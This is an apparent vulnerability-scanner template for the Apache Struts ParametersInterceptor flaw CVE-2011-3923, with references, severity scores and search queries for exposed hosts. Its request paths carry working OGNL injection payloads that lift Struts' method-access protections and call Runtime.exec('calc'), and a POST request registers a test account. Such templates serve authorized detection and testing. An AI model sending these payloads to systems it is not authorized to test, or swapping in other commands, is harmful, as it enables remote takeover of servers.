id: CVE-2011-3923

info:
  name: Apache Struts ParametersInterceptor Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: Apache Struts before 2.3.1.2 allows remote attackers to bypass security protections in the ParameterInterceptor class and execute arbitrary commands.
  impact: |
    Remote code execution leading to potential compromise of the affected system.
  remediation: |
    Upgrade to a patched version of Apache Struts or apply the necessary security patches to mitigate the vulnerability.
  reference:
    - http://seclists.org/fulldisclosure/2014/Jul/38
    - http://www.exploit-db.com/exploits/24874
    - http://www.securitytracker.com/id?1026575
    - https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2011-3923
    - https://exchange.xforce.ibmcloud.com/vulnerabilities/72585
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2011-3923
    cwe-id: CWE-732
    epss-score: 0.94455
    epss-percentile: 0.99309
    cpe: cpe:2.3:a:apache:struts:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: struts
    shodan-query: html:"Struts Problem Report"
    fofa-query: title="Struts2 Showcase"
    google-query: intitle:"struts2 showcase"
  tags: seclists,intrusive

http:
  - method: GET
    path:
      - "{{BaseURL}}/shop/product/reviews.action?product.productId=secconsult'%2b(%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'"
      - "{{BaseURL}}/shop/search.action?search=(%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('calc'))(secconsult)&z[(search)('secconsult')]=true"

    matchers:
      - type: word
        words:
          - "calc"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/shop/profile/register.action"

    body: |
      struts.token.name=struts.token&struts.token=8393EPOT4BN4CNYAJ6ETRI9DNR2FSP1R&formstate=list&customer.customerNick=SecTest&newPassword=SecTest123&repeatNewPassword=SecTest123&customer.customerCompany=SecTest&customer.customerGender=M&customer.customerTitel=SecTest&customer.customerFirstname=SecTest&customer.customerLastname=SecTest&customer.customerTelephone=&customer.customerEmailAddress=sectest@example.com&customer.customerCountryId=14&customer.customerZoneId=95&customer.customerPostalCode=SecTest&customer.customerCity=SecTest&customer.customerStreetAddress=SecTest&customer.customerHouseAddress=SecTest&captcha_honeypot=&customer.customerPrivacyRules=1&customer.customerId=87

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "SecTest"
        part: body
